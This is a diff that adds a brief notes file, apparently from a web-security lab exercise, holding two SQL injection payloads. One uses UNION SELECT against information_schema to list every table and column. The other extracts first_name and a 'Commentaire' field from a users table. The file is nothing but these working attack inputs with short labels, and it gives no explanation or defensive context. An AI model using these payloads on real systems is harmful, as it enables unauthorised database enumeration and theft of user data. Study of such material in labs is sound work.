@@ -1,0 +1,5 @@
+Get all collumns:
+1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
+
+Get first_name and Commentaire from table "users"
+1 AND 1=2 UNION SELECT first_name, Commentaire FROM users
